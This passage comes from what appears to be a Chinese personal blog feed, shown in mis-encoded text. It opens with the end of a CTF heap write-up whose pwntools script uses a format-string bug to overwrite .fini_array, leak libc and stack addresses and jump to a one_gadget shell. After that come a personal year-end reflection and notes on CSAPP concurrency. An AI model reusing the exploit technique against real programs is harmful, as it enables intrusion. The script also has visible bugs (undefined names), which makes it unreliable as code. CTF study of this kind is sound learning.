src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_fini.png"></p><p>æ–°çš„é—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆæŠŠ  <code>.fini_array</code>  è¾“å…¥è¿›æ ˆå¹¶ç¡®å®šå®ƒä¸ printf çš„åç§»ï¼ŸåŒä¸€ä¸ªå‡½æ•°çš„æ ˆç©ºé—´æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šåç§»ï¼Œåªéœ€è¦åˆ©ç”¨å‰é¢çš„ 0x80 çš„ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>.fini_arry</code> è¾“å…¥åˆ° s é‡Œç„¶åé€šè¿‡è°ƒè¯•ç¡®å®šåç§»ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/printf_padding.png"></p><p>æ–­ç‚¹æ‰“åœ¨ <code>printf(dest)</code> å¤„ï¼Œå¯ä»¥å¾—å‡ºæˆ‘ä»¬è¾“å…¥çš„ s åœ¨æ ˆä¸Šçš„åç§»æ˜¯ 12ã€‚</p><p>é™¤äº† fini çš„åç§»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¡®å®š libc åŸºå€çš„åç§»ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_padding.png"></p><p>è¿™ä¸ªæ ˆåœ°å€å§‹ç»ˆæŒ‡å‘æ¯”è‡ªå·±ä½ <code>0x10</code> å­—èŠ‚çš„æ ˆåœ°å€ï¼Œè€Œä¸”æŒ‡å‘çš„æ ˆåœ°å€å’Œè¿”å›åœ°å€ä¹Ÿæœ‰å›ºå®šçš„ <code>0x28</code> çš„åç§»ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼è¿™ä¸ªæ ˆåœ°å€ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p><p>æˆ‘ä»¬åœ¨å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ submitt å‡½æ•°çš„åŠŸèƒ½ã€‚æˆ‘ä»¬ç°åœ¨è¦†ç›–ç”¨ <em>v7</em> è¦†ç›–äº† <em>dest</em> éƒ¨åˆ†ï¼Œæ‰€ä»¥è¾“å‡ºçš„å­—ç¬¦ä¸²å°†æ˜¯ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_dest.png"></p><p>ç”±ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„éƒ¨åˆ†æ˜¯ chunk1 çš„å†…å®¹ï¼Œæˆ‘ä»¬æƒ³è¦æ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ¨åˆ†åœ¨ <em>dest</em> æŒ‡é’ˆå¤„ï¼Œå¯ä»¥æ§åˆ¶ chunk1 çš„å†…å®¹é•¿åº¦ï¼Œè®©å…¶ç¬¬äºŒæ¬¡è¢«å†™å…¥ <em>v5</em> æ—¶åˆšå¥½é‡å åœ¨ <em>dest</em> çš„ä½ç½®ã€‚</p><p>ä¹Ÿå°±æ˜¯ï¼š</p><p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>&#39;\n&#39;</code> + <code>Order 2:</code> + <code>Order 1:</code>) &#x3D; 0x90</p><p>size(<code>chunk1</code>) &#x3D; 0x90 - 28 &#x3D; 0x74</p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€  <code>chunk1</code> ä¸­çš„å†…å®¹çš„æ—¶å€™åªè¦ä½¿å…¶ä¸­é 0 å­—ç¬¦ä¸²çš„ä¸ªæ•°è¾¾åˆ° <code>0x74</code> å°±è¡Œäº†ã€‚</p><p>ç»¼ä¸Šï¼</p><blockquote><p>è¿™é“é¢˜å¯¹æˆ‘æ¥è¯´å¥½éš¾å•ŠğŸ˜¢å¯¹ç€åˆ«äººçš„ wp ç£•äº†ä¸¤å¤©æ‰å—‘æ˜ç™½ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„éƒ¨åˆ†è¿˜æ˜¯æœ‰äº›ç”Ÿç–äº†</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./books&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b main&quot;)</span><br>elf=ELF(<span class="hljs-string">&quot;./books&quot;</span>)<br>free_got=f.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,msg</span>):<br>    p.sendline(num)<br>    p.sendline(msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">num</span>):<br>    p.sendline(num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>fini_addr=<span class="hljs-number">0x6011b8</span><br>start = <span class="hljs-number">0x400780</span><br>one = [<span class="hljs-number">0x45206</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0xcc673</span>,<span class="hljs-number">0xcc748</span>,<span class="hljs-number">0xefa00</span>,<span class="hljs-number">0xf0897</span>,<span class="hljs-number">0xf5e40</span>,<span class="hljs-number">0xef9f4</span>] <br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(start &amp; <span class="hljs-number">0xffff</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27;c%13$hn&#x27;</span> <span class="hljs-comment">#ä¿®æ”¹finiçš„å†…å®¹</span><br>payload=payload+<span class="hljs-string">b&quot;function:%31$p stack:%33$p&quot;</span>    <span class="hljs-comment"># æ³„éœ²æ ˆé¡¶åœ°å€å’Œå‡½æ•°åœ°å€</span><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x74</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><br>edit(<span class="hljs-number">1</span>ï¼Œpayload)<br>submit(p64(fini_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;stack:&quot;</span>)<br>stack_addr=p.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)[:-<span class="hljs-number">1</span>]<br>stack_addr=<span class="hljs-built_in">int</span>(stack_addr,<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;function:&quot;</span>)<br>libc_start_main=p.recvuntil(<span class="hljs-string">b&quot; &quot;</span>)[:-<span class="hljs-number">1</span>]<br>libc_start_main=<span class="hljs-built_in">int</span>(libc_start_main,<span class="hljs-number">16</span>) <span class="hljs-comment"># å°†0xå½¢å¼çš„å­—ç¬¦ä¸²è½¬åŒ–æ•°å­—</span><br><br>libc_start_main=libc_start_main-<span class="hljs-number">240</span><br><br>libc_addr=libc_start_main-<span class="hljs-number">0x20750</span><br>stack_addr=stack_addr-<span class="hljs-number">0x1b0</span>-<span class="hljs-number">0x110</span> +<span class="hljs-number">208</span><br>onegadget_addr=libc_addr+<span class="hljs-number">0x45226</span><br><br><br>one_gadget = libc_base + one[<span class="hljs-number">0</span>]<br>one1 = u16(p64(one_gadget)[:<span class="hljs-number">2</span>])-<span class="hljs-number">22</span>  <span class="hljs-comment">#æœ€å2å­—èŠ‚ +åç§»</span><br>one2 = u8(p64(one_gadget)[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]) -<span class="hljs-number">6</span> <span class="hljs-comment">#æœ€åç¬¬3å­—èŠ‚+åç§»</span><br><br>delete2()<br><span class="hljs-built_in">print</span>(one1)<br><span class="hljs-built_in">print</span>(one2)<br>payload=<span class="hljs-string">b&quot;%&quot;</span>+one1+<span class="hljs-string">b&quot;c%13$hhn&quot;</span>+<span class="hljs-string">b&quot;%&quot;</span>+one2+<span class="hljs-string">b&quot;c%14$hn&quot;</span><br><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x90</span>-<span class="hljs-number">28</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><span class="hljs-comment"># Order 1: å†…å®¹\nOrder 2: Order 1: å†…å®¹\nOrder 2: \n</span><br>edit(<span class="hljs-number">1</span>ï¼Œpayload)<br><br>submit(<span class="hljs-string">b&#x27;5&#x27;</span>+<span class="hljs-number">7</span>*p8(<span class="hljs-number">0x0</span>)+p64(stack_addr+<span class="hljs-number">2</span>)+p64(stack_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023å¹´ç»ˆæ€»ç»“</title>
    <link href="/2023/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘è®¤ä¸ºï¼Œä»Šå¹´çš„æˆ‘å¹¶æ²¡æœ‰è¾œè´Ÿä¸Šä¸€å¹´çš„æœŸæœ›ã€‚</p><span id="more"></span><p>å¦‚æœç”¨ä¸€å¥è¯æ¥å½¢å®¹æˆ‘çš„ 2023 ï¼Œé‚£ä¹ˆæˆ‘è‚¯å®šä¼šè¯´ï¼šâ€ æ˜¯çƒ­çƒˆçš„ï¼Œåšå®šçš„ï¼ŒçœŸè¯šçš„ï¼Œå‹‡æ•¢çš„ã€‚ â€œ ğŸ³ï¸â€ğŸŒˆ</p><p>é¢å¯¹å³å°†åˆ°æ¥çš„ 2024ï¼Œæˆ‘æ‰“å¼€æ–‡æ¡£æƒ³è¦å†™ç‚¹ä»€ä¹ˆã€‚ä½†æ˜¯æˆ‘åˆä¸èƒ½é¡ºç•…çš„æŠŠæˆ‘è¿™ä¸€å¹´æ‹ä¸€éï¼Œå¤ªä¹…è¿œçš„ç»†ç¢è®°å¿†å·²ç»è®°ä¸æ¸…äº†ã€‚</p><p>2023å¹´ä¼Šå§‹ï¼Œæˆ‘å»çƒ«äº†ä¸ªå¤´è¿æ¥æ–°å¹´ã€‚æˆ‘æŠŠæˆ‘çš„å¤´å‘äº¤ç»™äº†ç»™æˆ‘å‰ªäº†å…­å¹´å¤´å‘çš„æ‰˜å°¼è€å¸ˆï¼Œä½†ç»“æœä¸å°½äººæ„ï¼Œæˆ‘æ˜¯å™™ç€æ³ªä»ç†å‘åº—å‡ºæ¥çš„ï¼Œå› ä¸ºé¡¶ç€è¿™ä¸ªå·å‘è®©æˆ‘æ„Ÿè§‰è‡ªå·±å°‘å¥‹æ–—äº†ä¸‰åå¹´ã€‚æ‰˜å°¼è€å¸ˆå®‰æ…°æˆ‘è¯´æ—¶é—´è¶Šä¹…è¶Šå¥½çœ‹ï¼Œæˆ‘å½“æ—¶ä¸å±‘ï¼Œè§‰å¾—ä»–è¾œè´Ÿäº†æˆ‘å¯¹ä»–çš„ä¿¡ä»»ã€‚ç°åœ¨çœ‹æ¥çš„ç¡®å¦‚ä»–æ‰€è¯´çš„é‚£èˆ¬ï¼Œéšç€ä¸€æ¬¡åˆä¸€æ¬¡åœ°å†²æ´—ï¼Œè¢«å‹ç¼©çš„æ…¢æ…¢å·å‘èˆ’å±•å¼€æ¥ï¼Œä»æœ€å¼€å­¦çš„æ°´æ³¢çº¹åˆ°ç°åœ¨çš„å¤§æ³¢æµªï¼Œè®¸ä¹…ä¸è§çš„æœ‹å‹éƒ½ä¼šæƒŠè‰³äºæˆ‘ä¸æ–­åˆ·æ–°çš„å‘å‹ã€‚ğŸ¤ª</p><p><del>å·å‘å°±æ˜¯å¤©èœçœŸçš„ä¸çŸ¥é“æˆ‘ç›´å‘çš„æ—¥å­æ˜¯æ€ä¹ˆè¿‡çš„ï¼ï¼</del></p><p>æœç„¶æ—¶é—´ä¼šæ”¹å˜ä¸€åˆ‡ã€‚</p><p>åœ¨ 2023ï¼Œæˆ‘å®Œæˆäº†ä¸€ä¸ªä¸¤å¹´ä¹‹å‰çš„è®¡åˆ’ï¼Œå‘æˆ‘çš„å°‘å¹´æ—¶ä»£å‘Šåˆ«ã€‚å»å¹´çš„å¹´ç»ˆæ€»ç»“é‡Œæåˆ°ï¼Œæˆ‘æœ‰ä¸€ä¸ªå†™éšç¬”çš„æœ¬å­ï¼Œåœ¨ä»Šå¹´æˆ‘åˆé™†é™†ç»­ç»­å¾€ä¸Šé¢æ·»äº†ä¸€ç‚¹æ— ç—›å‘»åŸçš„åšä½œæ–‡å­—ã€‚ç”Ÿæ—¥ä¹‹å‰ï¼Œæˆ‘æŠŠä»–ä»¬æ•´ç†èµ·æ¥ï¼Œç»™ä»–ä»¬åšäº†å‡ é¡µæ’å›¾å’Œå°é¢ï¼ŒæŠŠå®ƒå°æˆäº†ä¸€æœ¬å°ä¹¦ï¼Œå¯„ç»™äº†æ¯ä¸€ä¸ªå‚ä¸æˆ‘å°‘å¹´æ—¶ä»£çš„æœ‹å‹ã€‚</p><p><img src="/img/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/%E4%B9%A6.jpg" alt="ä¸å¥½æ„æ€æ²¡æœ‰æ¸…æ™°çš„å›¾ç‰‡äº†"></p><p>åä¹å²ç”Ÿæ—¥ï¼Œæˆ‘ä¸€å£æ°”åœ¨è€³æœµä¸Šæ‰“äº†å››ä¸ªé’‰ä½œä¸ºé€ç»™è‡ªå·±çš„åä¹å²ç¤¼ç‰©ï¼Œè¿™å¥½åƒæ˜¯æˆ‘æ•™æ¡äººç”Ÿçš„å®£æ³„å£ã€‚æˆ‘è¿˜è®°å¾—é‚£å¤©ï¼Œæˆ‘ä»ä¸‹è½¦å¼€å§‹ç´§å¼ ï¼Œç©¿åˆºåº—çš„æ¥¼æ¢¯å¥½åƒéƒ½æ¯”åˆ«çš„åœ°æ–¹è¦éš¾èµ°ã€‚å½“æˆ‘åä¸‹æ¥çš„æ—¶å€™ï¼Œæ„Ÿè§‰æ—¶é—´éƒ½è¢«æ”¾æ…¢äº†ï¼Œæˆ‘èƒ½å¬è§é’ˆç©¿è¿‡ä¸€å±‚å±‚èº«ä½“ç»„ç»‡çš„å£°éŸ³ï¼Œé‚£ä¸€åˆ»ï¼Œæˆ‘æ˜¯åœ¨è†å¬æˆ‘è‡ªå·±ã€‚ç¡¬ç‰©ç©¿è¿‡è½¯ç»„ç»‡ï¼Œèè¿›æˆ‘çš„èº«ä½“ï¼Œè®©æˆ‘æ„Ÿè§‰æŠŠè‡ªå·±å¡‘é€ æˆäº†ä¸€ä»¶è‰ºæœ¯å“ï¼ŒæŠŠé‚£ä¸€åˆ»çš„è‡ªç”±ç¼”ç»“æˆäº†æ°¸æ’ã€‚</p><blockquote><p>ä»€ä¹ˆæ—¶å€™å»å†ç©¿ä¸ªè€³èœ—å’Œè„é’‰å‘¢ğŸ§</p></blockquote><p><img src="/img/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/%E8%80%B3%E9%92%89.jpg"></p><p>æ„Ÿè§‰æˆ‘æ˜¯ä¸ªå¹¸è¿çš„å°å¥³å—¨ã€‚</p><p>å¤§å­¦ç¬¬ä¸€å¹´ä»€ä¹ˆéƒ½ä¸æ‡‚ï¼Œåšäº†å¾ˆå¤šäº‹ï¼Œä¸è¿‡å€’ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œæµ‘æµ‘å™©å™©è¿‡äº†ä¸€å¹´å¤§å­¦ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºå¤§ä¸€å­¦çš„é‚£äº›ä¸œè¥¿ï¼Œç°åœ¨çš„æˆ‘æ„Ÿè§‰æ¯”å‘¨å›´çš„äººéƒ½è¦è½»æ¾ã€‚æˆ‘ä¹‹å‰æ€»è¯´æ˜¯å¦ææ³°æ¥äº†ï¼Œä¹Ÿæˆ–è®¸å¹¶ä¸å‡†ç¡®ã€‚æˆ‘åº”è¯¥è¯´ï¼Œæˆ‘çš„äººç”Ÿä¸€ç›´éƒ½æ˜¯é¡ºåˆ©çš„ã€‚æˆ‘çœŸæ˜¯ä¸ªå‰å®³çš„å°å¥³å—¨ã€‚ğŸ˜Š</p><p>å¹´åˆå¼€å§‹æ¥è§¦ pwn ï¼Œå¼€å¯å°èœé¸¡å…»æˆè®¡åˆ’ã€‚äº”æœˆæˆ‘è¢«æ ¡é˜Ÿçš„å¸ˆå‚…ä»¬æ‹–å»å‚åŠ äº†äººç”Ÿä¸­ç¬¬ä¸€åœºçº¿ä¸‹æ¯”èµ›ï¼Œå½“ç„¶æ˜¯ä»€ä¹ˆéƒ½æ²¡åšå‡ºæ¥ï¼Œå»ç°åœºå½“äº†ä¸€ä¸ªè¿™èˆ¹å‰ç¥¥ç‰©ã€‚ä½†æ˜¯è®¤è¯†äº†å¾ˆå¤šæ–°æœ‹å‹ï¼Œè§äº†å¾ˆå¤šå¤§ä¸–é¢ï¼Œå…¬è´¹æ—…è¡ŒçœŸçš„çš„å¥½çˆ½å‘€ï¼ï¼æˆ‘çš„æˆé•¿çœŸçš„å¾ˆæ…¢ï¼Œæˆ‘å¤ªæ‡’æƒ°äº†ã€‚ä¹‹åå°±å¼€å§‹å‚åŠ å„ç§æ¯”èµ›ï¼Œå¶å°”èƒ½åšå‡ºä¸€é“é¢˜ï¼Œå°±æ„Ÿè§‰æˆ‘æ˜¯ä¸–ç•Œä¸Šæœ€å‰å®³çš„äººã€‚æš‘å‡åŠ å…¥äº† Nepnep ï¼Œè®¤è¯†äº†å¾ˆå¤šç‰›ç‰›çš„å¸ˆå‚…ï¼Œä¹Ÿéå¸¸æ„Ÿè°¢å¸ˆå‚…ä»¬çš„å¸®åŠ©å’Œæ•¦ä¿ƒï¼Œè®©æˆ‘è¿™ä¸ªå°èœé¸¡å¯ä»¥åŠ é€Ÿæˆé•¿ã€‚</p><p>ä»Šå¹´ä¹Ÿå»äº†å¾ˆå¤šåœ°æ–¹ï¼Œå¯¹äºæˆ‘è¿™ä¸ªä¸çˆ±å‡ºå»ç©çš„äººæ¥è®²ï¼Œå·²ç»åˆ·æ–°äº†æˆ‘çš„çœ‹ä¸–ç•Œè®°å½•ã€‚å¸Œæœ›æ˜å¹´å¯ä»¥å»ä¸€æ¬¡å¨æµ·ï¼Œçœ‹çœ‹éš”å£çš„æµ·æ˜¯ä»€ä¹ˆæ ·çš„ï¼›ä»Šå¹´æ¢å¤äº†çˆ±è¿åŠ¨çš„å°å¥³å­©å±æ€§ï¼Œè·‘æ­¥ã€æ’¸é“ï¼ˆéƒ½æ²¡åšæŒï¼‰ï¼Œç«‹å¿—æˆä¸ºé‡‘åˆšèŠ­æ¯”å¤±è´¥äº†ã€‚å¸Œæœ›æ˜å¹´å¯ä»¥æˆä¸ºé‡‘åˆšèŠ­æ¯”ã€‚</p><p>2023 å¹´æ˜¯å’Œå°å“ä¸€èµ·è¿‡çš„ï¼Œä»¥åä¹Ÿä¸€èµ·ã€‚</p><p>æœ€åï¼Œæˆ‘æ„Ÿè°¢æ‰€æœ‰æ¨ç€æˆ‘è¿™ä¸ªæ‡’æƒ°è™«æˆé•¿çš„æœ‹å‹ä»¬ã€‚</p><p>æ„¿æˆ‘æ‰€çˆ±ï¼Œå¹³å®‰é¡ºé‚ğŸ‡</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬åäºŒç«  å¹¶å‘ç¼–ç¨‹</title>
    <link href="/2023/12/26/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/12/26/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>æ„é€ å¹¶å‘ç¨‹åºå’Œå¹¶å‘å¼•èµ·çš„é—®é¢˜</p><span id="more"></span><p>å¦‚æœé€»è¾‘æ§åˆ¶æµåœ¨æ—¶é—´ä¸Šé‡å ï¼Œé‚£ä¹ˆå®ƒä»¬å°±æ˜¯å¹¶å‘çš„ã€‚</p><p>å¹¶å‘ä¸ä»…ä»…å±€é™äºå†…æ ¸ï¼Œå®ƒä¹Ÿå¯ä»¥åœ¨åº”ç”¨ç¨‹åºä¸­æ‰®æ¼”é‡è¦è§’è‰²ã€‚åº”ç”¨çº§å¹¶å‘åœ¨å…¶ä»–æƒ…å†µä¸‹ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ï¼š</p><ul><li>è®¿é—®æ…¢é€Ÿ I&#x2F;0 è®¾å¤‡</li><li>ä¸äººäº¤äº’</li><li>é€šè¿‡æ¨è¿Ÿå·¥ä½œä»¥é™ä½å»¶è¿Ÿ</li><li>æœåŠ¡å¤šä¸ªç½‘ç»œå®¢æˆ·ç«¯</li><li>åœ¨å¤šæ ¸æœºå™¨ä¸Šè¿›è¡Œå¹¶è¡Œè®¡ç®—</li></ul><p>ç°ä»£æ“ä½œç³»ç»Ÿæä¾›ä¸‰ç§åŸºæœ¬çš„æ„é€ å¹¶å‘ç¨‹åºçš„æ–¹æ³•ï¼šè¿›ç¨‹ã€I&#x2F;O å¤šè·¯å¤ç”¨ã€çº¿ç¨‹ã€‚</p><h1 id="åŸºäºè¿›ç¨‹çš„å¹¶å‘ç¼–ç¨‹"><a href="#åŸºäºè¿›ç¨‹çš„å¹¶å‘ç¼–ç¨‹" class="headerlink" title="åŸºäºè¿›ç¨‹çš„å¹¶å‘ç¼–ç¨‹"></a>åŸºäºè¿›ç¨‹çš„å¹¶å‘ç¼–ç¨‹</h1><p>æ„é€ å¹¶å‘ç¨‹åºæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ç”¨è¿›ç¨‹ï¼Œä½¿ç”¨ forkã€exec å’Œ waitpid ç­‰å‡½æ•°ã€‚ä¸€ä¸ªæ„é€ å¹¶å‘æœåŠ¡å™¨çš„è‡ªç„¶æ–¹æ³•å°±æ˜¯ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­æ¥å—å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ¥ä¸ºæ¯ä¸ªæ–°å®¢æˆ·ç«¯æä¾›æœåŠ¡ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%8F%911.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%8F%912.png"></p><h3 id="åŸºäºè¿›ç¨‹çš„å¹¶å‘æœåŠ¡å™¨"><a href="#åŸºäºè¿›ç¨‹çš„å¹¶å‘æœåŠ¡å™¨" class="headerlink" title="åŸºäºè¿›ç¨‹çš„å¹¶å‘æœåŠ¡å™¨"></a>åŸºäºè¿›ç¨‹çš„å¹¶å‘æœåŠ¡å™¨</h3><p>æœåŠ¡å™¨é€šå¸¸ä¼šè¿è¡Œå¾ˆé•¿çš„æ—¶é—´ï¼Œè¿™æ„å‘³ç€æ“ä½œç³»ç»Ÿä¸ä¼šå¸®åŠ©è¿›ç¨‹å›æ”¶å†…å­˜ï¼Œæˆ‘ä»¬éœ€è¦åšåˆ°ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>åŒ…æ‹¬ä¸€ä¸ª SIGCHLD å¤„ç†ç¨‹åºæ¥å›æ”¶åƒµæ­»è¿›ç¨‹ï¼Œå› ä¸º Linux çš„ä¿¡å·æ˜¯ä¸æ’é˜Ÿçš„ï¼Œæ‰€ä»¥è¯´ä¸€æ¬¡è¦å¤„ç†å®Œæ‰€æœ‰çš„å­è¿›ç¨‹ã€‚</li><li>å¯¹äºçˆ¶è¿›ç¨‹ï¼Œéœ€è¦åœ¨ fork ä¹‹åé©¬ä¸Š close å»ºç«‹è¿æ¥çš„æè¿°ç¬¦ï¼Œå¯¹äºå­è¿›ç¨‹æ¥è¯´ï¼Œä¹Ÿè¦å…³é—­æ‰€æœ‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li></ul><h3 id="è¿›ç¨‹çš„ä¼˜åŠ£"><a href="#è¿›ç¨‹çš„ä¼˜åŠ£" class="headerlink" title="è¿›ç¨‹çš„ä¼˜åŠ£"></a>è¿›ç¨‹çš„ä¼˜åŠ£</h3><p>è¿›ç¨‹å…±äº«æ–‡ä»¶è¡¨ï¼Œä½†æ˜¯ä¸å…±äº«ç”¨æˆ·åœ°å€ç©ºé—´ï¼ˆè¿™æ—¢æ˜¯ä¼˜ç‚¹ä¹Ÿæ˜¯ç¼ºç‚¹ï¼‰ï¼Œä¸ä¼šå‘ç”Ÿå†…å­˜è¦†ç›–çš„æƒ…å†µï¼Œä½†æ˜¯ä¹Ÿé€ æˆäº†é€šä¿¡å›°éš¾ã€‚</p><p>ä¸ºäº†é€šä¿¡ï¼Œéœ€è¦ä½¿ç”¨ IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰æœºåˆ¶ï¼Œä½†å®ƒé€šå¸¸æ¯”è¾ƒæ…¢ã€‚</p><h1 id="åŸºäº-I-x2F-O-å¤šè·¯å¤ç”¨çš„å¹¶å‘ç¼–ç¨‹"><a href="#åŸºäº-I-x2F-O-å¤šè·¯å¤ç”¨çš„å¹¶å‘ç¼–ç¨‹" class="headerlink" title="åŸºäº I&#x2F;O å¤šè·¯å¤ç”¨çš„å¹¶å‘ç¼–ç¨‹"></a>åŸºäº I&#x2F;O å¤šè·¯å¤ç”¨çš„å¹¶å‘ç¼–ç¨‹</h1><p>å¦‚æœæˆ‘ä»¬åŒæ—¶å“åº”è¿™ä¸¤ä¸ª I&#x2F;O äº‹ä»¶ï¼š 1) ç½‘ç»œå®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼Œ2) ç”¨æˆ·åœ¨é”®ç›˜ä¸Šé”®äººå‘½ä»¤è¡Œã€‚é‚£æˆ‘ä»¬è¯¥å…ˆå“åº”å“ªä¸€ä¸ªå‘¢ï¼Ÿã€‚å¦‚æœåœ¨ accept ä¸­ç­‰å¾…ä¸€ä¸ªè¿æ¥è¯·æ±‚ï¼Œæˆ‘ä»¬å°±ä¸èƒ½å“åº”è¾“å…¥çš„å‘½ä»¤ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœåœ¨ 